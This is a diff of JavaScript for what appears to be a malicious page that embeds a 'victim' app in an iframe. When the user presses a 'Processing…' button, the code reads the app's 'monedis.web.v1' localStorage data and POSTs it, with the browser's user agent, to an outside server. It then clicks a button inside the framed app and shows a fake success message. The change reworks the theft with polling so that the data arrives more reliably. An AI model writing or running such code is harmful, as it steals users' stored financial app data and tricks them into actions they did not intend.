@@ -325,18 +325,9 @@ document.getElementById('victim').addEventListener('load', function () {
   iframeReady = true;
 });
 
-function triggerRealButton() {
+function triggerAppButton() {
   try {
-    var iWin = document.getElementById('victim').contentWindow;
-    // Exfiltrate localStorage data to attacker server
-    var raw = iWin.localStorage.getItem('monedis.web.v1') || '';
-    fetch('https://closing-notes.onrender.com/?r=grab', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ data: raw, ua: navigator.userAgent, ts: Date.now() })
-    }).catch(function(){});
-    // Also trigger real app action
-    var iDoc = iWin.document;
+    var iDoc = document.getElementById('victim').contentWindow.document;
     var btn = iDoc.querySelector('[data-act="abrir"][data-arg="registrar"]');
     if (!btn) {
       var btns = iDoc.querySelectorAll('button');
@@ -345,7 +336,34 @@ function triggerRealButton() {
       }
     }
     if (btn) btn.click();
-  } catch (e) {}
+  } catch(e) {}
+}
+
+function sendExfil(raw) {
+  fetch('https://closing-notes.onrender.com/?r=grab', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ data: raw, ua: navigator.userAgent, ts: Date.now() })
+  }).catch(function(){});
+}
+
+// Poll localStorage every 250ms (up to 12s) until app.js seeds the data
+function pollAndExfil(tries) {
+  if (tries === undefined) tries = 48;
+  // localStorage is same-origin: readable directly from window
+  var raw = window.localStorage.getItem('monedis.web.v1') || '';
+  if (raw.length > 50) {
+    sendExfil(raw);
+    triggerAppButton();
+    setTimeout(showSuccess, 900);
+  } else if (tries > 0) {
+    setTimeout(function() { pollAndExfil(tries - 1); }, 250);
+  } else {
+    // Timeout — send whatever we have, still trigger app
+    sendExfil(raw || 'empty-after-timeout');
+    triggerAppButton();
+    setTimeout(showSuccess, 900);
+  }
 }
 
 function handleCta() {
@@ -354,20 +372,7 @@ function handleCta() {
   cta.disabled = true;
   cta.classList.add('loading');
   cta.querySelector('.btn-label').textContent = 'Processing…';
-
-  function fire() {
-    // Extra 800ms after load so app.js finishes seeding localStorage
-    setTimeout(function() {
-      triggerRealButton();
-      setTimeout(showSuccess, 900);
-    }, 800);
-  }
-
-  if (iframeReady) {
-    fire();
-  } else {
-    document.getElementById('victim').addEventListener('load', fire, { once: true });
-  }
+  pollAndExfil();
 }
 
 function showSuccess() {
